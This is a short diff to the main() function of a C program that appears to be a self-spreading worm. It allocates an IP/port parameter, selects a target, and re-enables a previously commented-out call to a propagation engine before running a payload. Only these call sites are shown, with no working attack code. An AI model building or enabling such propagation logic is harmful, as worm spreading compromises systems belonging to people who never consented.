@@ -34,6 +34,8 @@ void main(int argc, char *argv[]){
     srand(time(NULL));
     random = rand();
 
+    paramIPPort = malloc(2*sizeof(char *));
+    
     target_selection(paramIPPort);
 
 /*    if(random % 2){
@@ -56,6 +58,6 @@ void main(int argc, char *argv[]){
         }
     }*/
 
-    //propagation_engine();
+    propagation_engine(paramIPPort[0]);
     payload();
 }
